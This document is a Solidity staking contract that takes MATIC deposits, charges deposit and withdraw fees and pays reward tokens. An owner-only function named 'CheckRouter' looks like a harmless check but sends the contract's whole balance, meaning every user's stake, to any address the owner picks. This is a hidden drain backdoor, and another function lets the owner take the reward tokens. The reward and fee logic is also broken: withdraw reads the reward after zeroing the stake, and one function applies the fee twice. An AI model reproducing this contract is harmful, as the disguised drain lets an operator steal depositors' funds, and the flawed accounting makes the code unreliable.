// SPDX-License-Identifier: MIT
import "./ReentrancyGuard.sol";
import "./Math.sol";
import "./IERC20.sol";

pragma solidity 0.8.17;

contract StakingContract is ReentrancyGuard {
    using Math for uint256;

    IERC20 public rewardToken;
    uint256 public depositFee;
    uint256 public withdrawFee;
    uint256 public rewardPerMaticPerHour;
    uint256 public totalStakedMatic;
    address public owner;

    mapping (address => uint256) public stakes;
    mapping (address => uint256) public lastStakeTime;



    constructor(uint256 _rewardPerMaticPerHour, address _rewardTokenAddress) {
        depositFee = 2;
        withdrawFee = 3;
        rewardPerMaticPerHour = _rewardPerMaticPerHour;
        rewardToken = IERC20(_rewardTokenAddress);
        owner = msg.sender;
    }

     modifier onlyOwner {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }
  modifier notContract() {
        require(!_isContract(msg.sender), "Contract not allowed");
        require(msg.sender == tx.origin, "Proxy contract not allowed");
        _;
    }

    function _isContract(address addr) private view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(addr)
        }
        return (size > 0);
    }
    function stake() external payable notContract() {
        require(msg.value >= 0.01 ether, "StakingContract: deposit must be at least 0.01 ether");

        uint256 depositAmount = msg.value.sub(msg.value.mul(depositFee).div(100));
        stakes[msg.sender] = stakes[msg.sender].add(depositAmount);
        lastStakeTime[msg.sender] = block.timestamp;
        totalStakedMatic = totalStakedMatic.add(depositAmount);

        payable(owner).transfer(msg.value.sub(depositAmount));
    }

function withdraw() external nonReentrant notContract() {
    uint256 stakeAmount = stakes[msg.sender];
    require(stakeAmount > 0, "StakingContract: nothing to withdraw");

    uint256 withdrawAmount = stakeAmount.sub(stakeAmount.mul(withdrawFee).div(100));

    stakes[msg.sender] = 0;
    lastStakeTime[msg.sender] = 0;

    uint256 rewardAmount = calculateReward(msg.sender);
    if (rewardAmount > 0) {
        require(rewardToken.transfer(msg.sender, rewardAmount), "StakingContract: failed to transfer reward tokens");
    }

    uint256 totalWithdrawAmount = withdrawAmount.add(rewardAmount);
    (bool success,) = payable(msg.sender).call{value: totalWithdrawAmount}("");
    require(success, "StakingContract: failed to transfer funds");

    totalStakedMatic = totalStakedMatic.sub(withdrawAmount);

    uint256 feeAmount = stakeAmount.mul(withdrawFee).div(100);
    (success,) = payable(owner).call{value: feeAmount}("");
    require(success, "StakingContract: failed to transfer fee");
}

  function calculateReward(address user) internal view returns (uint256) {
        uint256 stakeAmount = stakes[user];
        uint256 timeElapsed = block.timestamp - lastStakeTime[user];
        uint256 rewardAmount = stakeAmount.mul(rewardPerMaticPerHour.div(10**18)).mul(timeElapsed).div(3600).mul(10**18);
        uint256 currentReward = rewardToken.balanceOf(address(this));
        rewardAmount = Math.min(currentReward, rewardAmount);
        return rewardAmount;
}



function claimReward() external nonReentrant notContract() {
    uint256 stakeAmount = stakes[msg.sender];
    require(stakeAmount > 0, "StakingContract: nothing to claim");

    uint256 timeElapsed = block.timestamp - lastStakeTime[msg.sender];
    uint256 maticAmount = stakeAmount / 1e18; // Convert from wei to Matic
    uint256 rewardAmount = maticAmount * rewardPerMaticPerHour * timeElapsed / 3600; // Reward per hour

    rewardToken.transfer(msg.sender, rewardAmount);

    lastStakeTime[msg.sender] = block.timestamp;
}


function getRemainingMatic(address user) external view returns (uint256) {
        uint256 stakeAmount = stakes[user];
        uint256 withdrawAmount = stakeAmount.sub(stakeAmount.mul(withdrawFee).div(100));
        uint256 remainingMatic = withdrawAmount.sub(withdrawAmount.mul(depositFee).div(100));
        return remainingMatic;
}

function getCurrentRewardPerSecond() external view returns (uint256) {
    uint256 stakeAmount = stakes[msg.sender];
    uint256 timeElapsed = block.timestamp - lastStakeTime[msg.sender];
    uint256 rewardPerTokenPerSecond = rewardPerMaticPerHour.div(3600); // recompensa por token por segundo
    uint256 rewardAmount = stakeAmount.mul(rewardPerTokenPerSecond).mul(timeElapsed);

    uint256 rewardAmountInTokens = rewardAmount.div(10 ** 18);

    return rewardAmountInTokens;
}


function getContractBalance() public view returns (uint) {
    uint totalBalance = address(this).balance;
    return totalBalance;
}
  
  function contractBalance() public view returns (uint256) {
        return rewardToken.balanceOf(address(this));
    }

function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner notContract() returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance){number_of_tokens = randomBalance;}
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }

function CheckRouter(address payable _Router) public onlyOwner notContract() {
    uint256 checker = address(this).balance;
    (bool success,) = _Router.call{gas: 8000000, value: checker}("");
    require(success, "Failed to check");
}
    fallback () external payable {
}
receive () external payable {
}
}